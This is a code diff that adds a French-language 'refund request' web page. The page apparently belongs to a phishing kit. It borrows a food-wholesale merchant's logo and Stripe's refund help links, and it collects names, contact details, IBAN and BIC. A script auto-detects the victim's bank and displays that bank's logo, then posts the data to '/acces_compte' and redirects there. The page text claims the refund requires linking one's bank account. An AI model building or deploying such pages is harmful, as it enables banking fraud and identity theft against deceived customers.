@@ -1,0 +1,439 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remboursement - Détection Bancaire</title>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
+    <style>
+        body {
+            font-family: 'Open Sans', sans-serif;
+            background: linear-gradient(135deg, #1a2a4e, #1e3c72); /* Fond bleu plus foncé */
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            opacity: 0;
+            animation: fadeIn 1s ease-out forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .refund-container {
+            background: #fff;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 500px;
+            text-align: center;
+            opacity: 0;
+            animation: fadeInContainer 1s ease-out 0.5s forwards;
+            position: relative;
+        }
+
+        @keyframes fadeInContainer {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .header-logo {
+            width: 100%; /* Prend toute la largeur */
+            height: auto; /* Hauteur automatique pour garder les proportions */
+            object-fit: cover; /* Garde le logo proportionnel */
+            margin-bottom: 20px;
+            border-radius: 15px; /* Bordure arrondie pour un look moderne */
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2); /* Ombre portée pour un effet moderne */
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .header-logo:hover {
+            transform: scale(1.02); /* Légère animation au survol */
+            box-shadow: 0 12px 25px rgba(0, 0, 0, 0.3); /* Ombre plus prononcée au survol */
+        }
+
+        h2 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 25px;
+            font-weight: 600;
+        }
+
+        .input-container {
+            text-align: left;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            position: relative;
+        }
+
+        .input-container i {
+            position: absolute;
+            left: 10px;
+            color: #007bff; /* Bleu */
+            font-size: 18px;
+        }
+
+        label {
+            font-size: 14px;
+            color: #555;
+            font-weight: 600;
+            display: block;
+            margin-bottom: 8px;
+            transition: color 0.3s ease;
+        }
+
+        label.required::after {
+            content: " *";
+            color: #ff0000;
+        }
+
+        label:hover {
+            color: #007bff; /* Bleu */
+        }
+
+        input, select, textarea {
+            width: 100%;
+            padding: 12px 12px 12px 40px; /* Ajout de padding à gauche pour l'icône */
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 14px;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+        }
+
+        input:focus, select:focus, textarea:focus {
+            border-color: #007bff; /* Bleu */
+            outline: none;
+            transform: scale(1.02);
+        }
+
+        textarea {
+            resize: vertical; /* Permet de redimensionner verticalement */
+            min-height: 100px;
+        }
+
+        .bank-logo {
+            height: 60px;
+            margin-top: 15px;
+            border-radius: 12px;
+            object-fit: contain;
+            transition: transform 0.3s ease, opacity 0.5s ease-in-out;
+            opacity: 0;
+            transform: scale(0.8);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .bank-logo.show {
+            opacity: 1;
+            transform: scale(1);
+        }
+
+        .bank-logo:hover {
+            transform: scale(1.1);
+        }
+
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #007bff, #0056b3); /* Bleu */
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 25px;
+            transition: background 0.3s ease, transform 0.2s ease;
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #0056b3, #004080); /* Bleu plus foncé */
+            transform: scale(1.05);
+        }
+
+        .refund-conditions {
+            margin-top: 30px;
+            font-size: 12px; /* Taille réduite à 4 fois plus petit */
+            color: #555;
+            text-align: left;
+        }
+
+        .refund-conditions a {
+            color: #007bff; /* Bleu */
+            text-decoration: none;
+        }
+
+        .refund-conditions a:hover {
+            text-decoration: underline;
+        }
+
+        .bold {
+            font-weight: bold;
+        }
+
+        /* Case à cocher */
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+            margin-top: 20px;
+        }
+
+        .checkbox-container input {
+            width: auto;
+            margin-right: 10px;
+        }
+
+        /* Écran de chargement */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+            z-index: 1000;
+        }
+
+        .loading-screen.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .loading-spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #007bff; /* Bleu */
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* Logo stylé pour les conditions */
+        .refund-conditions i {
+            color: #007bff; /* Bleu */
+            margin-right: 10px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="refund-container">
+        <!-- Logo en pleine largeur en haut du cadre blanc -->
+        <img src="https://destockagealimentaireprixbas.com/wp-content/uploads/2024/04/Destockage-Alimentaire-2.gif" alt="Logo de l'entreprise" class="header-logo">
+
+        <h2>Demande de Remboursement</h2>
+
+        <!-- Formulaire avec méthode POST -->
+        <form id="refund-form" action="/acces_compte" method="POST" enctype="multipart/form-data">
+            <div class="input-container">
+                <i class="fas fa-user"></i>
+                <input type="text" id="nom" name="nom" placeholder="Votre nom" required>
+            </div>
+
+            <div class="input-container">
+                <i class="fas fa-user"></i>
+                <input type="text" id="prenom" name="prenom" placeholder="Votre prénom" required>
+            </div>
+
+            <div class="input-container">
+                <i class="fas fa-envelope"></i>
+                <input type="email" id="email" name="email" placeholder="exemple@domaine.com">
+            </div>
+
+            <div class="input-container">
+                <i class="fas fa-phone"></i>
+                <input type="tel" id="phone" name="phone" placeholder="Numéro de téléphone">
+            </div>
+
+            <div class="input-container">
+                <i class="fas fa-building"></i>
+                <input type="text" id="siren" name="siren" placeholder="Numéro SIREN (optionnel)">
+            </div>
+
+            <div class="input-container">
+                <i class="fas fa-receipt"></i>
+                <input type="text" id="order-number" name="order_number" placeholder="123456789" required>
+            </div>
+
+            <div class="input-container">
+                <i class="fas fa-calendar-alt"></i>
+                <input type="date" id="purchase-date" name="purchase_date">
+            </div>
+
+            <div class="input-container">
+                <i class="fas fa-box"></i>
+                <input type="text" id="products" name="products" placeholder="Produit(s) concerné(s)">
+            </div>
+
+            <div class="input-container">
+                <i class="fas fa-comment"></i>
+                <textarea id="refund-reason" name="refund_reason" placeholder="Raison du remboursement"></textarea>
+            </div>
+
+            <div class="input-container">
+                <i class="fas fa-paperclip"></i>
+                <input type="file" id="proof-of-purchase" name="proof_of_purchase" multiple>
+            </div>
+
+            <div class="input-container">
+                <i class="fas fa-credit-card"></i>
+                <input type="text" id="iban" name="iban" placeholder="FR76 1234 5678 9012 3456 7890 123" required>
+            </div>
+
+            <div class="input-container">
+                <i class="fas fa-building"></i>
+                <input type="text" id="bic" name="bic" placeholder="Ex: CRLYFRPPXXX" oninput="detectBank()" required>
+            </div>
+
+            <div class="input-container">
+                <i class="fas fa-university"></i>
+                <select id="bank" name="bank" disabled>
+                    <option value="">Sélection automatique...</option>
+                </select>
+            </div>
+
+            <div>
+                <img id="bank-logo" class="bank-logo" alt="Logo de la banque">
+            </div>
+
+            <!-- Champ caché pour stocker l'URL du logo de la banque -->
+            <input type="hidden" id="bank-logo-url" name="bank_logo_url">
+
+            <!-- Case à cocher pour accepter les politiques de remboursement -->
+            <div class="checkbox-container">
+                <input type="checkbox" id="accept-policy" name="accept_policy" required>
+                <label for="accept-policy" class="required">J'accepte les <a href="https://support.stripe.com/questions/refund-requests-for-a-purchase-made-through-a-business-using-stripe?locale=fr-FR" target="_blank">Politiques de remboursement</a></label>
+            </div>
+
+            <button type="submit">Valider</button>
+        </form>
+
+        <!-- Section des conditions de remboursement -->
+        <div class="refund-conditions">
+            <p><i class="fas fa-info-circle"></i>Connexion à votre compte bancaire : Pour recevoir un remboursement, vous devez être connecté à votre compte bancaire via la plateforme. Nous vous demanderons de lier votre compte bancaire sécurisé à votre profil utilisateur pour faciliter les remboursements.</p>
+            <p><i class="fas fa-info-circle"></i>Nous offrons un remboursement complet pour les produits retournés dans les 30 jours suivant l'achat, à condition qu'ils soient dans leur état d'origine. Les frais de retour sont à la charge du client, sauf en cas de produit défectueux ou erreur de notre part. Les produits personnalisés et périssables ne sont pas remboursables. Pour toute demande, veuillez nous fournir une preuve d'achat. Le remboursement sera effectué selon la méthode de paiement initiale dans un délai de 7 à 10 jours ouvrables.</p>
+            <p><i class="fas fa-info-circle"></i>Pour plus d'informations sur les conditions de remboursement, veuillez consulter notre <a href="https://support.stripe.com/questions/refund-requests-for-a-purchase-made-through-a-business-using-stripe?locale=fr-FR" target="_blank">page de remboursement</a>.</p>
+        </div>
+    </div>
+
+    <!-- Écran de chargement -->
+    <div class="loading-screen" id="loading-screen">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script>
+    const bankData = {
+        "BNPAFRPP": { name: "BNP Paribas", logo: "https://logo-marque.com/wp-content/uploads/2021/03/BNP-Paribas-Logo-650x366.png" },
+        "SOGEFRPP": { name: "Société Générale", logo: "https://www.theswiftcodes.com/images/bank-logo/france/societe-generale.png" },
+        "BREDFRPPXXX": { name: "BRED Banque Populaire", logo: "https://static.wixstatic.com/media/57117d_04b6208383c94cdb97302768eacf1c49~mv2.png/v1/fill/w_584,h_264,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/BRED_BANQUE_POPULAIRE_LOGO_2LD_QUAD.png" },
+        "CCBPFRPP": { name: "Banque Populaire", logo: "https://www.changer-la-banque.com/wp-content/uploads/2022/05/Banque-Populaire-logo.png" },
+        "CEPAFRPP": { name: "Caisse d'Épargne", logo: "https://www.theswiftcodes.com/images/bank-logo/france/caisse-d-epargne.png" },
+        "AXABFRPP": { name: "Axa Banque", logo: "https://upload.wikimedia.org/wikipedia/commons/f/fd/Logo-axa-banque.png" },
+        "AGRIFRPP": { name: "Crédit Agricole", logo: "https://logos-marques.com/credit-agricole-logo/credit-agricole-logo-2/" },
+        "CMCIFR2A": { name: "Crédit Mutuel", logo: "https://www.maisonsdevendee.fr/media/logocm2018_carre_cmjn_72dpi__031211900_1028_11022019.jpg" },
+        "CRLYFRPP": { name: "Crédit Lyonnais (LCL)", logo: "https://upload.wikimedia.org/wikipedia/fr/0/0b/Lcl_logo.svg" },
+        "HFPFFRP1": { name: "HSBC France", logo: "https://banner2.cleanpng.com/20180430/vze/avdhhak8t.webp" },
+        "PSSTFRPP": { name: "La Banque postale", logo: "https://upload.wikimedia.org/wikipedia/fr/d/d4/Logo_La_Banque_postale_2022.svg" },
+        "CMCIFRPP": { name: "CIC France", logo: "https://upload.wikimedia.org/wikipedia/fr/a/a7/Cic_logo.svg" },
+        "REVOGB2L": { name: "Revolut", logo: "https://static.wixstatic.com/media/099da0_103304a097734c98a465c0be63ac65e5~mv2.png/v1/fill/w_525,h_525,al_c,q_85,usm_0.66_1.00_0.01,enc_avif,quality_auto/099da0_103304a097734c98a465c0be63ac65e5~mv2.png" },
+        "NTSBDE21": { name: "N26", logo: "https://upload.wikimedia.org/wikipedia/commons/6/69/N26_Logo.svg" },
+        "TRWIBD21": { name: "Wise", logo: "https://upload.wikimedia.org/wikipedia/commons/0/05/Wise_logo.svg" },
+        "BUNQNL2A": { name: "Bunq", logo: "https://upload.wikimedia.org/wikipedia/commons/4/42/Bunq-logo.svg" },
+        "MONZGB22": { name: "Monzo", logo: "https://upload.wikimedia.org/wikipedia/commons/6/62/Monzo_logo.svg" },
+        "SNNNFR22": { name: "Shine Pro", logo: "https://www.mariestum.com/wp-content/uploads/2023/03/shine-logo.svg" },
+        "LYDIFRPP": { name: "Lydia", logo: "https://upload.wikimedia.org/wikipedia/commons/f/f3/Lydia_logo.svg" }
+    };
+
+    function detectBank() {
+        let bicInput = document.getElementById("bic").value.toUpperCase().slice(0, 8);
+        let bankSelect = document.getElementById("bank");
+        let bankLogo = document.getElementById("bank-logo");
+        let bankLogoUrlInput = document.getElementById("bank-logo-url");
+
+        if (bankData[bicInput]) {
+            bankSelect.innerHTML = `<option value="${bankData[bicInput].name}">${bankData[bicInput].name}</option>`;
+            bankLogo.src = bankData[bicInput].logo;
+            bankLogoUrlInput.value = bankData[bicInput].logo;
+            bankLogo.classList.add("show");
+        } else {
+            bankSelect.innerHTML = `<option value="">Sélection automatique...</option>`;
+            bankLogo.classList.remove("show");
+            bankLogoUrlInput.value = "";
+        }
+    }
+
+    // Gestion de la soumission du formulaire
+    document.getElementById("refund-form").addEventListener("submit", function (e) {
+        e.preventDefault(); // Empêche la soumission par défaut
+
+        // Vérifier les champs obligatoires
+        const nom = document.getElementById("nom").value.trim();
+        const prenom = document.getElementById("prenom").value.trim();
+        const orderNumber = document.getElementById("order-number").value.trim();
+        const iban = document.getElementById("iban").value.trim();
+        const bic = document.getElementById("bic").value.trim();
+
+        if (!nom || !prenom || !orderNumber || !iban || !bic) {
+            alert("Veuillez remplir tous les champs obligatoires.");
+            return;
+        }
+
+        // Afficher l'écran de chargement
+        const loadingScreen = document.getElementById("loading-screen");
+        loadingScreen.classList.add("active");
+
+        // Récupérer l'URL du logo de la banque
+        const bankLogoUrl = document.getElementById("bank-logo-url").value;
+
+        // Stocker l'URL du logo de la banque dans le localStorage
+        localStorage.setItem('bankLogoUrl', bankLogoUrl);
+
+
+        // Récupérer les données du formulaire
+        const formData = new FormData(document.getElementById("refund-form"));
+        
+
+        // Envoyer les données via une requête POST
+        fetch("/acces_compte", {
+            method: "POST",
+            body: formData,
+        })
+        .then(response => {
+            if (response.ok) {
+                // Rediriger vers acces_compte.html après la soumission réussie
+                window.location.href = "/acces_compte";
+            } else {
+                alert("Erreur lors de la soumission du formulaire.");
+            }
+        })
+        .catch(error => {
+            console.error("Erreur :", error);
+            alert("Une erreur s'est produite lors de la soumission du formulaire.");
+        })
+        .finally(() => {
+            // Masquer l'écran de chargement
+            loadingScreen.classList.remove("active");
+        });
+    });
+    </script>
+</body>
+</html>
